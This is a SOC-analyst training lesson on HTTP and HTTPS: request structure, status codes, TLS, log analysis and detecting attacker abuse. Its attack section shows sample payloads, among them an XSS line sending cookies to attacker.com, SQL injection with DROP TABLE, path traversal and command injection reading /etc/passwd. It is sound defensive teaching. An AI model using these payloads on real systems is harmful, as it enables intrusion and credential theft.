# Lesson 4.2 — HTTP and HTTPS — Deep Dive

**Phase:** 4 — Protocols
**Prerequisite:** Lesson 4.1
**Time to complete:** 45 minutes

---

## What Is HTTP? (Simple)

HTTP (HyperText Transfer Protocol) is the language that web browsers and web servers use to communicate.

When you open a website, your browser sends an HTTP request to the server: "Please give me this page."
The server sends back an HTTP response: "Here is the page content."

HTTP is the foundation of the World Wide Web. Every website, every web application, every REST API uses HTTP (or its encrypted version, HTTPS).

---

## When Is It Used?

HTTP: Web browsing, web applications, REST APIs, webhooks, file downloads.
HTTPS: Same as HTTP but encrypted. Used by virtually all modern websites.

As a SOC analyst, you will see HTTP/HTTPS traffic constantly. It is by far the most common protocol in most environments. It is also the most abused by attackers.

---

## How HTTP Works Behind the Scenes

### Request-Response Model

HTTP is a request-response protocol. The client (browser) sends a request. The server sends back a response. This is a complete cycle.

### HTTP Methods (Verbs)

GET — Retrieve data from the server.
Example: "Give me the homepage." GET / HTTP/1.1
No body in a GET request. Parameters in the URL.

POST — Submit data to the server.
Example: "Here is my login form data." 
Includes a body with data. Used for form submissions, file uploads.

PUT — Create or replace a resource.
Example: "Create this new record" or "Replace this existing record."

PATCH — Partially update a resource.
Example: "Change only the user's email address."

DELETE — Remove a resource.
Example: "Delete this record."

HEAD — Like GET but return only headers, not the body.
Used to check if a resource exists, get its size, etc.

OPTIONS — Ask what methods the server accepts.
Also used in CORS (Cross-Origin Resource Sharing) preflight requests.

For SOC:
GET — Usually benign (browsing), but GET parameters in URLs can carry attack payloads (SQL injection, XSS).
POST — Used for logins, uploads, form submissions. Also used for data exfiltration and sending malware commands.
POST with unusual URL or content type is suspicious.

### HTTP Request Structure

```
METHOD /path/to/resource HTTP/version
Host: target-server.com
Header-Name: Header-Value
...
[blank line]
[request body — for POST/PUT]
```

Real example — Browser requesting a webpage:
```
GET /dashboard HTTP/1.1
Host: company-intranet.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obi5zbWl0aCJ9.abc123
Connection: keep-alive
```

### HTTP Response Structure

```
HTTP/version STATUS_CODE Status-Text
Header-Name: Header-Value
...
[blank line]
[response body]
```

Real example — Server responding with a webpage:
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 48392
Date: Fri, 15 Mar 2024 10:22:31 GMT
Server: nginx/1.24.0
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self'
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...; HttpOnly; Secure; SameSite=Strict

<!DOCTYPE html>
<html>
[HTML content...]
```

### HTTP Status Codes — Critical Knowledge

1xx — Informational
100 Continue — Keep sending the request

2xx — Success
200 OK — Request succeeded
201 Created — Resource created
204 No Content — Request succeeded, no body returned

3xx — Redirection
301 Moved Permanently — Resource moved, update your link
302 Found — Temporary redirect
304 Not Modified — Cached version is still good

4xx — Client Error
400 Bad Request — Malformed request
401 Unauthorized — Authentication required
403 Forbidden — You do not have permission
404 Not Found — Resource does not exist
405 Method Not Allowed — That HTTP method is not allowed
429 Too Many Requests — Rate limited

5xx — Server Error
500 Internal Server Error — Server encountered an error
502 Bad Gateway — Upstream server error
503 Service Unavailable — Server is overloaded or down

SOC relevance of status codes:
Large numbers of 404s from one IP → directory scanning / content discovery
Many 401s or 403s → authentication brute force attempts
500 errors correlating with unusual input → potential exploitation attempt
200 after many 401s → brute force succeeded
Many 200s for unusual URLs → successful exploitation

---

## Key HTTP Headers for SOC Analysts

### Request Headers

User-Agent:
Identifies what software is making the request.
Normal: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0"
Suspicious:
- "python-requests/2.28.0" — automated script, not a browser
- "curl/7.74.0" — command-line download tool
- "Go-http-client/2.0" — programming language HTTP client
- "Masscan/1.0" — port/vulnerability scanner
- "" (empty) — malware often sends no user-agent
- Extremely old browsers (IE 6.0) — unlikely in 2024, may be malware spoofing

Host:
The domain being accessed.
Attackers sometimes use IP addresses directly (no hostname) — suspicious.
In web application attacks, the Host header can be manipulated.

Authorization:
Contains credentials or tokens.
"Authorization: Basic dXNlcjpwYXNz" — Base64 encoded "user:pass" (basic auth)
"Authorization: Bearer eyJhbGc..." — JWT token (JSON Web Token)

Cookie:
Session tokens, user preferences.
Theft of cookies = session hijacking — attacker can impersonate you without knowing your password.

Referer:
What page the user came from.
"Referer: http://phishing-site.com" → user was on a phishing page and clicked a link.

X-Forwarded-For:
Shows the original IP when traffic has gone through a proxy.
Format: X-Forwarded-For: 192.168.1.55, 10.0.0.1
The leftmost IP is usually the original client (but can be spoofed).

### Response Headers

Server:
What web server software is running.
"Server: Apache/2.4.41" tells attackers what to look for exploits against.
Best practice: Remove or obfuscate this header.

Set-Cookie:
Sets cookies in the browser.
Security flags: HttpOnly (JS cannot read it), Secure (HTTPS only), SameSite (CSRF protection).
Missing security flags are vulnerabilities.

Content-Security-Policy (CSP):
Defines what resources can be loaded (prevents XSS attacks).

X-Frame-Options:
Prevents the site from being embedded in iframes (prevents clickjacking).

---

## HTTPS — How Encryption Works

### TLS Handshake (Detailed)

When your browser connects to an HTTPS site:

1. Client Hello:
   Browser announces: "I support TLS 1.3 (or 1.2), and I support these cipher suites."
   Sends a random number.

2. Server Hello:
   Server responds: "Let's use TLS 1.3 with AES-256-GCM."
   Sends its certificate (contains the server's public key and identity).
   Sends its own random number.

3. Certificate Verification:
   Browser checks the certificate:
   - Is it signed by a trusted Certificate Authority (CA)?
   - Is it for the correct domain (company-intranet.com)?
   - Is it still valid (not expired)?
   - Has it been revoked?
   If any check fails: Browser shows a warning.

4. Key Exchange:
   Client generates a pre-master secret encrypted with the server's public key.
   Both sides use this + their random numbers to derive the same session key.
   No one intercepting the traffic can derive this key.

5. Encrypted Communication Begins:
   All subsequent data is encrypted with the session key.
   AES-256-GCM is common — extremely strong encryption.

### What SOC Can See in HTTPS Traffic (Without SSL Inspection)

Even without decrypting HTTPS, you can see:

- Source and destination IP addresses (Layer 3)
- Destination port (443 or custom)
- SNI (Server Name Indication) — the hostname in the TLS handshake (pre-encryption)
  This tells you the domain being accessed even without decryption
- Certificate details — issuer, subject, validity
- Data volume and timing
- Whether the certificate is self-signed or from an unknown CA (suspicious)

What you CANNOT see without decryption:
- The actual URLs being accessed
- The request/response bodies
- Usernames, passwords, tokens in HTTP headers
- File contents being uploaded or downloaded

### SSL/TLS Inspection (Man-in-the-Middle by the Firewall)

Some organizations deploy SSL inspection appliances that:
1. Act as a proxy between the client and server
2. Present their own certificate to the client (so the client trusts the "firewall" as the CA)
3. Create a new TLS connection to the real server
4. Inspect the decrypted traffic
5. Re-encrypt it

This is controversial (privacy vs security) but provides full URL visibility.

---

## How Attackers Abuse HTTP/HTTPS

### 1. C2 Over HTTP/HTTPS (Command and Control)

Malware uses HTTP/HTTPS for C2 because:
- It is always allowed through firewalls
- It blends in with legitimate traffic
- HTTPS encrypts the communication, hiding the content

Beaconing:
Malware periodically checks in with the C2 server.
```
14:00:00 → GET /beacon HTTP/1.1 Host: c2-server.com (send status, receive commands)
14:05:00 → GET /beacon HTTP/1.1 Host: c2-server.com
14:10:00 → GET /beacon HTTP/1.1 Host: c2-server.com
```
Regular intervals = beaconing = C2 communication.

Signs of C2 over HTTP:
- Regular, periodic requests (every X minutes, like clockwork)
- Requests at all hours including 3 AM
- Unusual User-Agent strings
- Connections to newly registered or unknown domains
- Responses are very small (a few bytes) — just commands
- The URL path or parameter contains encoded data

### 2. Data Exfiltration via HTTP

Attacker uploads stolen data to an external server using HTTP POST.

```
POST /upload HTTP/1.1
Host: attacker-server.com
Content-Type: application/octet-stream
Content-Length: 4718012

[4.5 MB of encrypted, compressed stolen data]
```

Signs:
- Large POST requests to unknown external servers
- POST requests at unusual times
- Content-Type is unusual (binary data, octet-stream)
- High data volume from servers that normally send data, not receive it

### 3. Web Application Attacks (Layer 7)

SQL Injection:
```
GET /users?id=1' OR '1'='1'-- HTTP/1.1
GET /users?id=1; DROP TABLE users;-- HTTP/1.1
```
The attack payload is in the URL parameter. A WAF or IDS at Layer 7 can detect this.

Cross-Site Scripting (XSS):
```
GET /search?q=<script>document.location='http://attacker.com?c='+document.cookie</script> HTTP/1.1
```
Injects JavaScript to steal session cookies.

Directory Traversal:
```
GET /files/../../../etc/passwd HTTP/1.1
GET /files/%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
```
Tries to read files outside the web root.

Command Injection:
```
POST /ping HTTP/1.1
body: ip=127.0.0.1;cat /etc/passwd
```
Injects OS commands into a vulnerable application.

### 4. Drive-By Download

User visits a compromised or malicious website.
JavaScript silently downloads and executes malware.

Proxy log signature:
```
14:33:21 192.168.1.55 john.smith GET http://compromised-news.com/article HTTP/1.1 200 48,392
14:33:22 192.168.1.55 john.smith GET http://malicious-cdn.com/exploit.js  HTTP/1.1 200 142,000
14:33:22 192.168.1.55 john.smith GET http://malicious-cdn.com/payload.exe HTTP/1.1 200 2,481,024
```
User browsed a news site that embedded a malicious CDN script, which downloaded malware.

---

## HTTP Logs — Reading and Analyzing

### Web Server Access Log (Apache/Nginx format):
```
192.168.1.55 - john.smith [15/Mar/2024:14:22:31 +0000] "GET /index.html HTTP/1.1" 200 48392 "https://company.com/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36"
```

Fields:
- 192.168.1.55 — client IP
- john.smith — authenticated username (or "-" if not authenticated)
- [15/Mar/2024:14:22:31 +0000] — timestamp
- "GET /index.html HTTP/1.1" — method, URL, protocol version
- 200 — status code
- 48392 — response bytes
- "https://company.com/home" — referer
- "Mozilla/5.0..." — user agent

### Proxy Log (Squid/BlueCoat format):
```
1710505351.123   234 192.168.1.55 TCP_MISS/200 48392 GET https://company-intranet.com/ - DIRECT/104.215.148.63 text/html
```

### Suspicious HTTP Log Patterns

Directory scanning:
```
192.168.1.55 - - [15/Mar/2024:03:22:00] "GET /admin HTTP/1.1" 404
192.168.1.55 - - [15/Mar/2024:03:22:01] "GET /administrator HTTP/1.1" 404
192.168.1.55 - - [15/Mar/2024:03:22:01] "GET /wp-admin HTTP/1.1" 404
192.168.1.55 - - [15/Mar/2024:03:22:02] "GET /phpmyadmin HTTP/1.1" 404
192.168.1.55 - - [15/Mar/2024:03:22:02] "GET /login HTTP/1.1" 200
```
Scanning for admin pages. Found one (200 on /login).

SQL Injection attempt:
```
185.220.101.47 - - [15/Mar/2024:14:33:21] "GET /search?q=1%27+OR+%271%27%3D%271 HTTP/1.1" 500
```
URL-decoded: GET /search?q=1' OR '1'='1
The server returned 500 (error) — this may indicate the injection worked on the backend.

Data exfiltration via POST:
```
192.168.1.88 - - [15/Mar/2024:03:14:00] "POST /upload HTTP/1.1" 200 12 4718012
```
4.7 MB POST at 3:14 AM → suspicious exfiltration.

---

## Common Analyst Mistakes

Mistake 1: Ignoring the User-Agent.
Reality: Malware and attackers use distinctive user agents. Knowing normal user agents for your environment helps you spot anomalies.

Mistake 2: Only looking at 4xx and 5xx responses.
Reality: A successful attack returns 200 OK. The attack succeeded. Focus on unusual 200 responses as much as errors.

Mistake 3: Thinking HTTPS is safe to ignore.
Reality: Attackers use HTTPS specifically because many organizations trust encrypted traffic. Use SNI visibility, certificate analysis, and URL categorization even without decryption.

Mistake 4: Not correlating proxy logs with endpoint logs.
Reality: If you see a malicious file downloaded in proxy logs, correlate with EDR logs to see if the file was executed.

---

## Summary

HTTP is the foundation of web communication — request/response model.
Key HTTP methods: GET (retrieve), POST (submit data), PUT/DELETE (modify).
Status codes tell the story: 200=success, 401=auth needed, 403=forbidden, 404=not found, 500=server error.
HTTPS encrypts HTTP content — visible: IP, SNI, timing, volume. Not visible: URL, body, headers.
Key headers: User-Agent (what made the request), Host (target domain), Cookie (session), Authorization (credentials).
Attackers abuse HTTP for C2, data exfiltration, SQL injection, XSS, directory traversal.
HTTP/proxy logs are among your richest evidence sources.

---

## Practice Questions

**Easy:**
1. What HTTP method is used when you submit a login form?
2. What does HTTP status code 401 mean?
3. What is SNI and why is it useful for SOC analysts?

**Medium:**
4. A proxy log shows requests to the same URL every 5 minutes, 24 hours a day, from the same internal IP. The responses are always 12 bytes. The domain was registered last week. What is this?
5. A web server log shows: GET /admin/config.php?debug=1' OR 1=1-- HTTP/1.1 → 500. What attack is this? What does the 500 response tell you?

**Thinking Questions:**
6. An attacker wants to exfiltrate 50 GB of data using HTTPS. They want to avoid detection. How might they structure the exfiltration to avoid triggering alerts? What would you look for to detect it anyway?
7. A proxy log shows an internal computer using User-Agent "python-requests/2.28.0" making POST requests to an external IP on port 8080 every 3 minutes. Each POST sends about 500 bytes and receives 20 bytes. This has been happening for 6 days. Explain what this is and how serious it is.
